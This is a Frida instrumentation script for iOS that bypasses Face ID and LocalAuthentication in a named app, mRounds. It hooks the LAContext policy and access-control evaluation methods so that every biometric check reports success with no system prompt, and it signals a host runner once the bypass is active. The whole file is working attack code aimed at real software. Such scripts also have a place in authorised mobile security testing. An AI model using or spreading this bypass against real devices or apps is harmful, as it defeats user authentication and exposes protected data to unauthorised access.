'use strict';
/* Robust iOS Face ID / LocalAuthentication bypass for mRounds (com.innovapptive.mrounds)
   - canEvaluatePolicy:error:                      -> YES (biometry "available")
   - evaluatePolicy:localizedReason:reply:         -> immediate success, NO system prompt
   - evaluateAccessControl:operation:reason:reply: -> immediate success
   Emits send() events so the host runner can confirm the bypass programmatically. */

function log(s) { console.warn(s); }
function notify(o) { try { send(o); } catch (e) {} }

var _Block_copy = null, _Block_release = null;
try {
  _Block_copy = new NativeFunction(Module.getExportByName(null, '_Block_copy'), 'pointer', ['pointer']);
  _Block_release = new NativeFunction(Module.getExportByName(null, '_Block_release'), 'pointer', ['pointer']);
} catch (e) { log('[!] Block fns unavailable: ' + e); }

// A block's invoke fn pointer sits at offset 16 on arm64: {isa(8), flags(4), reserved(4), invoke(8)}
function invokeReply(blockPtr, success) {
  var invoke = blockPtr.add(16).readPointer();
  var fn = new NativeFunction(invoke, 'void', ['pointer', 'int', 'pointer']);
  fn(blockPtr, success ? 1 : 0, ptr(0)); // reply(block, BOOL success, NSError* error = nil)
}

function forceSuccess(replyPtr) {
  var copied = _Block_copy ? _Block_copy(replyPtr) : replyPtr;
  ObjC.schedule(ObjC.mainQueue, function () {
    try { invokeReply(copied, true); } catch (e) { log('[!] reply invoke err: ' + e); }
    if (_Block_release && !copied.equals(replyPtr)) { try { _Block_release(copied); } catch (e) {} }
  });
}

function installHooks() {
  if (!ObjC.available) return false;
  var LAContext = ObjC.classes.LAContext;
  if (!LAContext) return false;

  try {
    Interceptor.attach(LAContext['- canEvaluatePolicy:error:'].implementation, {
      onLeave: function (ret) { ret.replace(ptr(1)); }
    });
    log('[+] canEvaluatePolicy:error: -> forced YES');
  } catch (e) { log('[!] canEvaluatePolicy: ' + e); }

  try {
    var sel = '- evaluatePolicy:localizedReason:reply:';
    Interceptor.replace(LAContext[sel].implementation, new NativeCallback(function (self, cmd, policy, reason, reply) {
      var r = '';
      try { r = new ObjC.Object(reason).toString(); } catch (e) {}
      log('[*] evaluatePolicy(policy=' + policy + ', reason="' + r + '") -> AUTO-SUCCESS (prompt suppressed)');
      notify({ tag: 'evaluatePolicy', policy: '' + policy, reason: r });
      forceSuccess(reply);
      notify({ tag: 'bypass-applied' });
    }, 'void', ['pointer', 'pointer', 'int64', 'pointer', 'pointer']));
    log('[+] evaluatePolicy:localizedReason:reply: -> REPLACED (auto-success, no prompt)');
  } catch (e) { log('[!] evaluatePolicy replace: ' + e); }

  try {
    var ac = '- evaluateAccessControl:operation:localizedReason:reply:';
    if (LAContext[ac]) {
      Interceptor.replace(LAContext[ac].implementation, new NativeCallback(function (self, cmd, acRef, op, reason, reply) {
        log('[*] evaluateAccessControl -> AUTO-SUCCESS');
        notify({ tag: 'evaluateAccessControl' });
        forceSuccess(reply);
      }, 'void', ['pointer', 'pointer', 'pointer', 'int64', 'pointer', 'pointer']));
      log('[+] evaluateAccessControl:... -> REPLACED (auto-success)');
    }
  } catch (e) { log('[!] evaluateAccessControl: ' + e); }

  return true;
}

if (ObjC.available && installHooks()) {
  log('[*] Face ID bypass ACTIVE');
  notify({ tag: 'hooks-installed' });
} else {
  var n = 0;
  var iv = setInterval(function () {
    n++;
    if (installHooks() || n > 200) {
      clearInterval(iv);
      log('[*] Face ID bypass ACTIVE (deferred)');
      notify({ tag: 'hooks-installed' });
    }
  }, 50);
}
